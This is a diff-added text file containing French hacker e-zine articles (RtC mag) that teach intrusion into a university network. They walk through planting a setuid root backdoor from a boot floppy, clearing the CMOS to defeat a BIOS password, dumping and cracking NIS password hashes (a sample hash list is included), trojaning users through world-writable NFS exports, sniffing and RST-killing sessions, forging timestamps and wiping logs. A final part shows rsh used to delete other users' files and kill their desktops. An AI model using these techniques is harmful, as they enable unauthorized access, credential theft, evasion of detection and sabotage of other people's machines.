@@ -1,0 +1,540 @@
+-------[  RtC Mag, At the end of the universe  ]
+
+--------------[  HackRezo  ]
+---------[ in RtC mag 3,4,5 ]
+----[  by Par4noID && S/ash <rtcgang@yahoo.fr> ]
+
+
+
+-------[  01) TheorieZ in few methods   [by Mister /]
+
+Beaucoup de pirates devant un reseau si simple que un reseau de fak essaient des techniques longues et difficiles alors qu'il existe des methodes bien plus faciles. Je vais vous decrire les methodes (un peu bourrines il est vrai) testees et approuvees par ma fak.
+
+
+   *** La disquette boot
+
+
+Le principe est tres simple : dans l'acces public de mon bahut j'ai ecrit un petit prog sympas (style : "setuid(0); setgid(0); system("/bin/bash");") camoufler dans un programme factice. Je l'ai compile sous le nom de 'bd' et j'ai rebootee la machine avec une disquette de boot linux.
+Puis arriver sous le shell, j'ai execute ma passe :
+# mount /dev/hdb1 /mnt -t ext2 (je monte la partition linux de la machine)
+# mv /mnt/home/guest /mnt/bin  (je deplace le prog a l'endroit qui m'interesse)
+# chown bin.root /mnt/bin/bd   (je mets l'utilisateur qui m'interesse)
+# chmod 6755 /mnt/bin/bd       (mettre le bit suid)
+# umount /mnt                  (demonter la partition)
+# reboot
+
+voila maintenant quand je lance le prog sur la machine y me renvoie un bash root.
+Arrrrrggggghhhhhhh : voila la gueule du shell : "bash# " (vous avez remarquez le '#' : il me trahit). No problem : "export PS1='bash$ '" me renverra le shell classique (cool ;) ). ReArrrrrrgggghhhhhh : je tape la flèche du haut et on revoie mes commandes, bon
+ben je quitte le bash, je lance un editeur et, hop, on edite le '.bash_history'.
+
+Mais j'en ais marre de me taper les pauv' disks de la redhat vous me direz. Ben faites vos disquettes vous-meme : un tres bon outil pour cela est 'zdisk'. Arrrrrgggghhhhhhh (bis) : il me renvoie une disquette formatter DMF sur un ordi qui ne le supporte pas... Ben c'est pas grave : recompilez un petit kernel (genre 300 ko compresse), au passage editez les fichiers du types syslinux.cfg pour modifier l'affichage au boot (et le prompt au passage), editez le fichier rescue.gz en faisant :
+
+# gunzip rescue.gz
+# mount -o loop rescue /mnt -t ext2 (monter le systeme dans le rep /mnt)
+et editez le repertoire mnt. Une fois fini, faites :
+# umount /mnt
+# gzip -9 rescue
+Ensuite formatter la disquette par : 'fdformat -n /dev/fd0H1440' (par exemple) Copiez les fichier necessaire : 
+# mount /floppy
+# cp votre_noyau /floppy/kernel
+# cp rescue.gz /floppy/
+# cp syslinux.cfg /floppy/
+# umount /floppy
+# syslinux -s /fd0H1440       (installez le linux loader)
+et voila vous avez une disquette bien a vous...
+
+Une autre solution est la disquette du rtcg4ng.
+
+N.B. : le fichier a un petit pb :
+$ ls -l /bin/bd
+-rwsr-sr-x   1 root     bin          3655 Jun 10 14:07 bd*
+                                          ^^^^^^^^^^^^
+Vous voyez la date, allez hop 'touch -t 103100001995 bd'. Maintenant :
+$ ls -l /bin/bd
+-rwsr-sr-x   1 root     bin          3655 Oct 31 1995  bd*
+$ echo 'Cool !'
+Cool !
+(Au passage il faut aussi modifier la date de /bin)
+
+
+   *** Le logger de touche
+
+
+Le principe est simple : on utilise un petit logiciel qui intercepte les touches tapées et qui se déclenche a certains mots (comme 'root'). 
+D'abord voir le type de logger a utiliser :
+	* Si on a le root sur une machine, on va pas s'emmerder : on le lance dans un des scripts de demarrage.
+	* Sinon ben on infecte le boot en passant par un autre OS (et oui, ils ont des systemes couples linux/windows). Pour cela on utilisera les methodes d'infections du boot des virus (en effet, le viruses ne sert pas que a creer des virus) et on ira ecrire sur une partition que l'on connait (partition DOS)
+Rq : ne vous inquietez pas on va en coder un avec Par4noiD.
+
+Bon, c'est bo un keylogger mais comment on va chopper le root ?
+Ben si les admins sont assez cons pour se logger en local en root pour resourdre les problemes, il suffit d'en causer un. Par exemple un petit 'ls -l .bashrc' dans le compte guest me donne :
+-rw-------   1 guest    users         555 May 15 9:35   .bashrc
+Ah, les cons, allez hop un petit 'vi .bashrc' et je rajoute :
+alias emacs='echo "only root can do this"'
+Je deloggue. Maintenant quand quelqu'un voudra lancer emacs il aura un message :
+"only root can do this" : bingo, il va appeler l'admin qui, comme un con, va se logger en root sur la machine et a moi son pass.
+Un moyen de le faire plus rapidement est d'appeler une personne (plus particulièrement une fille : cf Reverse Engeneering) et de lui faire faire ce q'un user banal devrait faire.
+
+
+   *** Ecrire bourrin sur la partition
+
+
+Si ces pauv' couillon on installe win95/98 en parallèle avec linux et n'ont pas crypter le systeme de fichier linux (ah les cons), on peut installer la backdoor tranquille avec le petit utilitaire explor2fs qui permet de lire/ecrire des partition linux depuis windows. (au passage il est également possible d'en faire un sous DOS avec les sources : a venir)
+
+
+   *** NIS
+
+
+Dans un reseau on a souvent besoins d'avoir le même environnement quelque soit la machine. Ainsi dans ma faq, ces couillons utilisent NIS (et non NIS+) pour cela ben j'ai fais un petit 'ypcat passwd.byname > /floppy/fak.pwd' et j'ai recupere la liste des pass des comptes NIS : allez hop mon cracker de mots de passe...
+
+
+   *** Bon ca marche tjrs pas : utilisez les failles les plus connus
+
+
+Essayer les failles classiques, comme les sendmails...
+
+
+   *** Gainning root access on main server
+
+
+Dans la plupart des methodes decrite ici on ne gagne qu'un acces local en root (sur une machine). Le probleme est d'avoir acces a tout le reseau :
+* NFS : beaucoup de reseau utilise NFS, ecrivez donc sur ces partitions pour transferer votre backdoor d'un systeme a l'autre. Avec un peu de chance vous aurez un truc du style /usr exporte en ecriture : alors la, vous avez le reseau en entier en ecrivant votre backdoor dessus.
+* le keylogger : comme expliquer au dessus il peut vous donner le pass root
+* le spoofing : une fois que vous avez le root en local, vous pouvez très bien modifier les parametres de la station pour cous faire passer pour un serveur (quitte a le smurfer pour le remplacer).
+
+D'autres methodes existent pour remonter le systeme, mais je ne peux toutes les exposees ici.
+
+
+   *** Effacer ses traces
+
+
+Effacer ses traces est une choses très importante. J'ai explique les principales traces a effacer. Il y en a cependant d'autres : les logs dans le repertoire /var/logs, les eventuels fichiers core...
+Il est tres importants d'effacer l'historique des commandes car imaginez que quelqu'un remonte cette historique et tombe sur une commande du style 'ypcat passwd.byname' : vous avez pas l'air con...
+De plus, utilisez plutot des backdoors du style de 'bd' plutot que des comptes root trafiques style 'toor::0:0::/bin/sh' car quand vous ferez un finger ou un who sur la machine on ne vera que le compte guest utilise au login.
+
+
+   *** C'est bien bo tout ca mais que faire du root ?
+
+
+Tout ce que vous voulez, evitez cependant de modifier des donnees chaudes comme la config ou le site web.
+Pour ce qui est de la config, vous pouvez la modifier si vous remetez tout en place avant de partir.
+Vous pouvez vous creer un petit cluster pour, par exemple, calculer une putain d'anim d'une heure sur un reseau relativement puissant (ou encore faire du brute force cracking en testant toutes les combinaisons imaginables sur des fichiers de mots de passe).
+
+
+
+
+-------[  02) TheorieZ par l'exemple        [by Par4]
+
+Je vais d'abord commencer cette article par une petite mise au point. Le Hack 
+Rezo (ie l'art et la manière de pénétrer et de prendre possesion d'un réseau) 
+est à mes yeux  (et à ceux de la RtC), LE FONDEMENT du hacking!        
+Personne n'en doute? arf, si seulement... (on parle encore de toi Koko)
+
+Si j'écris cette article, ce n'est pas tant pour expliquer les bases de cet 
+art que pour répondre à cette tendance de la scène francaise d'évaluer le 
+niveau d'un hacker au nombre de pages qu'il a piraté!
+Soyons sérieux 2 minutes, prendre pour un hacker un utilisateur d'exploits, 
+un lame muni de cgi-scan, cela est à peu près équivalent à considérer 
+miKrokro comme des informaticiens.
+
+Si vous voulez modifier des pages, passez votre chemin, allez sur 
+www.hack.co.za, charger des exploits dont vous ignorez le sens, faites un 
+rapport nessus (faites vous loguer au passage) et changer vos p'tain de pages 
+mais surtout, surtout, arrétez de nous péter les couilles (sauf pour les 
+pages fachos).
+
+Un hacker peut utiliser des exploits. Mais
+1/ Il doit les comprendre (j'en ai marre d'expliquer comment modifier 
+un buff overflow parce qu'il faut changer l'adresse......)
+2/ Ils doivent servir à rentrer sur un réseau et pas à changer la page de 
+www.laglisse.com ou www.comment_cuisiner_les carottes.org!
+
+Et maintenant l'article --------------------------------------------- 
+
+Penetration rezo: les bases.
+
+Tranquilement assis devant votre écran à fumer je ne sais quel substance 
+toxique ;), vous voulez, mettons, accedez à certains documents d'un certain 
+rezo, par exemple, au hasard, de l'éducation nationale ( ;) to Andro && / ).
+
+Deux cas: 
+-vous attaquez de l'extérieur 
+-vous attaquez de l'interieur 
+
+#keep rollin', rollin', rollin'
+
+{ DE l'interieur....
+
+Vous avez un compte linux (mettons guest) sur une machine dans une salle 
+style libre service (ce rezo n'a bien sur qu'une existence fictive, toute 
+ressemblance avec un rezo connu de certains membres n'est que le pur fruit du 
+hasard _héhé_ )
+
+bash$ whoami
+guest
+
+Ok, redemarrer la machine avec une disquette bidon dans le lecteur!
+
+Not a disk system ... 
+
+bingo, on démarre d'abord sur le lecteur de disquette!
+
+--------------remarque-------------------
+rarement les boot sont protégés. Cependant si vous etes face a une machine
+qui démarre d'abord sur le disque dur, regarder si le BIOS est protégé par
+un passe. Si ce n'est pas le cas, choisissez comme ordre d'amorce A,C sinon
+on va essayer de deplomber le boot. Pour le rezo ""fictif"" dont je vous
+parle, le BIOS etait protege par un passe, mais les machine tournaient et
+sous nux et sous win3.1. reBingo! Je demarre sous win3.1 et je compile :
+
+&&&&&&&&&&&&&&&&&
+.model tiny
+.code
+
+	ORG 100h
+
+Debut :
+
+        mov cx, 40h     ; on se prépare à écrire 40 octets
+	xor ah,ah	; ah=0
+
+Boucle :
+
+        mov al,ah       ; on met l'adresse de l'octet dans al
+        out 70h,al      ; on demande l'ecriture
+	xor al,al
+	out 71h, al	; un 0 sur le port 71h
+        inc ah		; octet suivant
+	loop Boucle
+ 
+END Debut
+&&&&&&&&&&&&&&&&&&
+
+tasm borp.asm 
+tlink borp /t 
+
+et voila le travail.....
+borp.com a alors pour effet de decharger la pile CMOS, ie votre machine va
+redemarrer avec les parametres initiaux, rereBingo, en general avec les  
+parametres initiaux le BIOS est accessible sans passe.
+
+-----------fin de la remarque--------------------
+
+Bene, nous avons des lors une machine qui demarre sur le lecteur de 
+disquette. Pas de pb, on utilise alors le disk RTC (que l'on pourrait presque
+considerer comme un truc de constructif, non Kosak ? )
+
+bash$ bd mot_pass
+bash# ahahhhhhhhhaaaaaaaaaahhhhhhhhhhhhh
+
+-----------remarque pour Kosak-------------------
+le # ca veut dire que j suis root
+-------------------------------------------------
+
+reBene.
+
+------------------Remarque2----------------------
+Si le boot est inviolable, vous pouvez alors commencer à utiliser des
+exploits, on regarde sendmail, ftp s'il tourne, buff overflow, runner,
+etc.....
+-----------fin de la remarque--------------------
+
+bash# more /etc/passwd
+
+...
+...   shadowed passfile
+...
++
+
+On remarque le zoli + final qui signifie que le systeme utilise NIS.
+rereBene.
+La plupart des rezo n'ont pas encore compris l'utilité de NIS+, ce qui donne 
+
+bash# ypcat passwd.byname
+
+a:cevY7jUakGTLo:601:101::/mnt/home/a:/bin/bash
+b:ctjZnfkQXiens:602:101::/mnt/home/b:/bin/bash
+c:Y6xqbn.VysVU2:603:101::/mnt/home/c:/bin/bash
+d:sU/8O2fSviSrM:604:101::/mnt/home/d:/bin/bash
+e:g4QUli87j/oYc:610:101::/mnt/home/e:/bin/bash
+f:kE18olxNI/Cgg:606:101::/mnt/home/f:/bin/bash
+g:d6YFgmApd8cv2:607:101::/mnt/home/g:/bin/bash
+h:9cTl3d6VXAlT.:608:101::/mnt/home/h:/bin/bash
+i:vIWaEjTGwWQN0:609:101::/mnt/home/i:/bin/bash
+j:s8M/3Me9XIToA:605:101::/mnt/home/j:/bin/bash
+p:HcwbvoKhnNA5Q:611:101::/mnt/home/k:/bin/bash
+v:aEjFDkjFD99Lf:612:101::/mnt/home/l:/bin/bash
+c:ESsjPe8a3skkw:613:101::/mnt/home/m:/bin/bash
+
+^-----Map NIs dont j'ai censure les noms pour eviter que certaines balances 
+(K!#@ak) leur telephone...............
+
+rererererererrBene, j'balance crackJ/ak avec le RTCdico (rien de 
+constructif, hein K#!@ak)
+
+g4QUli87j/oYc me renvoie comme pass 'phi', re..reBene.
+Deja un compte.
+
+------------------Remarque----------------------------
+Il est ici possible qu'aucun mot de passe ne soit faible, c'est même souvent
+le cas. On ne désespere alors pas:
+si d'autres utilisateurs existent, c'est qu'ils doivent utiliser leur compte
+(rq pertinente!).
+Le but va donc être de repérer les machines auquelles ils se connectent par,
+par exemple, une série de finger.
+
+Mettons que "bash# finger @KF-03" --> renvoie l'utilisateur p
+
+; si le port finger (79) est fermé, vous pouvez toujours essayer de compter
+  sur les outils rwho ou rusers.
+
+Une fois que nous savons que l'user p utilise régulièrement la machine KF-03,
+on peut essayer de lui tendre un piège.
+1/ Vous avez accès à la machine (physiquement ou par connection):
+   --> physiquement, réutiliser les techniques expliquées précédemment pour
+       passer root puis modifier le prog login ou poser un simple cheval de
+       troie.
+   --> par connection, essayer les exploits distants classiques, ou coller
+       lui un prog auquel il fera confiance.
+       ex: dans le rézo dont je vous parle:
+       * l'user p possédait un répertoire public exporté à everyone et
+       utilisé par d'autres user de confiance. Vous montez le repertoire puis
+       vous collez votre cheval de troie, classique mais efficace...
+       * pire , la machine NIS exportait son repertoire /home en everyone,
+       et hop, un joli .rhost si le port rlogin est ouvert sinon même
+       technique que précédemment, l'utilisateur a peu de chances de se
+       méfier d'un fichier se trouvant dans son home.
+       
+2/ Vous n'avez pas acces à la machine...
+    Surveillez l'ensemble du rezo, ainsi mettons que p se connecte
+    régulièrement à la machine KF-89 par un simple telnet.
+    Snif, snif... Sniffer puis casser sa connection. (un ensemble de paquets
+    RST permettent en général d'arriver à ses fins).
+    Attendez qu'il se reconnecte, puis vous aurez, en clair s'il vous plait,
+    son pass.
+
+3/ Je n'ai pas accès à la machine et l'user utilise ssh!
+   cf rtcmag4, si vous avez le controle du serveur ssh, volez lui son MAGIC
+   Cookies, puis faites des captures clavier-ecran.
+   Je n'ai pas accès au serveur ssh!
+   Essayer le SE, ou un autre utilisateur.
+
+-----------------------fin de la remarque--------------------------------
+
+Ah oui, j'aurais peut-etre du vous le signaler, mon but est d'atteindre la 
+machine numero 16, qui contient certaines informations, sur certains 
+personnages (du groupe?), qu'il serait utile de modifier.
+
+Ok, la machine 16 est cliente NIS, je possede donc un compte sur elle, 
+puisqu'elle obeit à la même map NIS. 
+
+Je repere alors un autre utilisateur NUX, la machine 25.
+
+bash# exit
+bash$ telnet KF-25
+
+Autant voir si le port 21 est ouvert depuis cette machine, cela m'évitera de
+me faire prendre (Kosak, si tu avais lu cet article peut être ne te serais
+tu pas fait prendre par la SEFTI)
+ 
+KF-25$ telnet KF-16
+
+login: e
+pass: 
+
+KF-16$ exit
+KF-25$ exit
+
+bash$               
+Ok , le port telnet est ouvert, tout va bien....
+J'evite de trop trainer sur 25 car un finger me trahirait. 
+
+Bon je veux devenir ROOT sur 16.
+
+----Remarque pour Kosak, le roi du Hack------------------------
+ROOT est le nom donne au super utilisateur.
+---------------------------------------------------------------
+
+bash# more /etc/fstab
+
+
+/dev/hda1    /dos       vfat    rw          0 0
+/dev/hda2    /          ext2	defaults    1 1
+/dev/hda3    swap       swap    defaults    0 0
+none         /proc	    proc    defaults    0 0
+serveur:/usr /usr       nfs     defaults,rsize=8192,wsize=8192  0 0
+/dev/fd0     /floppy    vfat    user,noauto,sync   0 0
+ 
+Tiens serveur export ?
+
+serveur est la machine 20 , c'est aussi le serveur d'impression de la
+salle ;). Toutes les machines de la salle montent cette machine au démarrage.
+ 
+bash# exit
+bash$ telnet KF-25
+   
+KF-25$ /usr/sbin/showmount -e KF-20
+
+Export list for KF-20:
+/             (everyone)
+/home         (everyone)
+/usr          (everyone)
+
+Que lis-je ? /
+                 ¦¦¦¦¦¦¦¦¦¦¦¦
+                 ¦ everyone ¦
+                 ¦¦¦¦¦¦¦¦¦¦¦¦
+
+KF-16 n'est pas dans ma salle, cependant, avec un peu de chances, elle
+montent au démarrage l'un des répertoires de KF-20:
+
+bash# exit
+bash$ telnet KF-25
+
+KF-25$ telnet KF-20
+
+login: e
+pass:
+
+KF-20$ et on regarde l'export list
+
+KF-00
+...
+
+
+KF-16      <------------ arffffffffff
+...
+
+KF-10000000000 ;)
+
+re.............................................reBingo!!!!
+
+
+On va donc écrire sur le serveur d'impression, qui est aussi serveur NFS.
+
+bash$ bd mdp
+bash# ;)
+
+On crée d'abord un nouveau répertoire...
+
+bash# mkdir /tmp/Marie
+
+... que l'on utilise pour monter le disque de KF-20
+
+bash# mount KF-20:/ -t nfs /tmp/Marie
+bash# cp bd /tmp/Marie
+
+On copie le joli SUID 0 sur KF-20
+
+bash# exit
+bash$
+bene, l'attaque peut dès lors être finalisée!
+
+bash$ telnet KF-25
+Comme d'hab, on se protège...
+
+KF-25$ bd mdp
+KF-25# valahhhhhh,...
+On modifie finger pour éviter de se faire tracer et on attaque...
+
+KF-25# exit
+KF-25$ telnet KF-20
+login: e
+pass:
+KF-20$ bd mdp
+KF-20# yahhhhhhooooooooooooooooooooooooo ;)  ( Andro j vais pouvoir te
+                                               satisfaire ;) )
+
+Voila, quelques fichiers furent modifiés, puis les traces effacées.
+Cet article ne montre pas TOUTES les facons de passer maitre d'un rezo.
+Il constitue juste un exemple d'intrusion.
+
+
+
+-------[  03) TheorieZ du jeu en rezo   [by Par4]
+
+29/05/2000: La pluie tombe à seau, je suis fatigué et ma voiture ne démarre plus. Bref tout va bien! Attendant le retour du beau temps pour agir, je me suis réfugié dans cet antre obscur que l'on nomme salle info de la FAK. hein?
+ILS ont LINUX! cette phrase m'échappant, mes muscles du visage commencerent à se delier et un immense rire m'echappa. 
+A coté de l'ordinateur, une notice pour se connecter! et un numéro 35, celui de ma machine.
+On y va, connection! 
+
+login: public
+password:
+
+fak35$ _
+
+Bon, je sors ma disquette RTCg4ng.
+
+fak35$ mount /mnt/floppy
+fak35$ cd /mnt/floppy
+
+Je repere dans la salle une dizaine de personnes utilisant Linux, bon allez j'ai envie de m'amuser. Je repere leur numero, de 26 à 32.
+
+fak35$ ./RTCscan fak26 			
+
+comme son nom l'indique RTCscan est le scan officiel du g4ng RTC, made in SLy and Par4noID		
+
+....
+PORT 513 is openED
+....
+
+Naaaaaan, le port login est ouvert! le port login permet d'envoyer des r-commandes, c'est-à-dire des commandes réseaux.
+
+fak35$ rsh fak26 
+
+j'execute ici la r-commande rsh qui me donne un shell sur la machine distante.
+
+fak26$ _		
+
+J'ai ainsi recupere un shell sur la machine distante.
+
+fak26$ mount /mnt/floppy
+
+je monte la disquette distante
+
+fak26$ cd /mnt/floppy
+fak26$ ls
+Owinter.mp3
+
+fak26$ rm /mnt/floppy/Owinter.mp3
+
+la, je veux dire, pas de pitié! on efface tout.
+Regardons maintenant les processus lancés par sa machine.
+(en gros un processus est un objet dynamique, contenant du code, des variables, une pile d'execution, chargé en memoire. En tres tres gros c'est un "programme"  qui s'éxécute en arriere-plan)
+
+fak26$ ps ax
+
+la commande ps permet d'afficher les information sur la table des processus.
+Il y a notamment un processus qui m'interesse, il s'agit de fwm, il s'agit du process X-window.
+Sous Linux, les processus sont reperés par le systeme par des numéros que l'on nomme PID. Par la commande ps ax , le nom fwm s'affiche au coté de son PID, ici 168.
+
+fak26$ kill -9 168
+
+J'envoie alors au processus 168 (X-window) le signal 9 (le signal fermeture!)
+Et la, je vois le x-window de la machine26 se fermer. Jouissance extreme.
+
+fak26$ exit
+fak35$ _
+
+Continuons, on s'attaque cette fois-ci à Fak27
+
+fak35$ rsh Fak27
+fak27$ _
+
+X-window peut etre considere comme un serveur, et ne l'oublier jamais, comme un serveur d'affichage. Si vous etes un client autorisé, vous pouvez afficher sur la machine distante.
+
+fak27$ export DISPLAY=fak27:0.0
+fak27$ xhost +
+
+Maintenant tout le monde est un client autorisé!!
+
+fak27$ exit
+fak35$ xpinguin -display fak27:0.0 &
+
+Et un joli pinguin sur la machine distante...
+   								
+Bon fini de jouer, ma voiture m'attend.
+Avant de deconnecter, non c'est pas vrai: ils n'ont pas protégé le boot...
+Je reviendrai demain (voir prochain mAg et comment on passe au travers de boot non protect pour etre rooooooot!).
+
+-------[  EOF
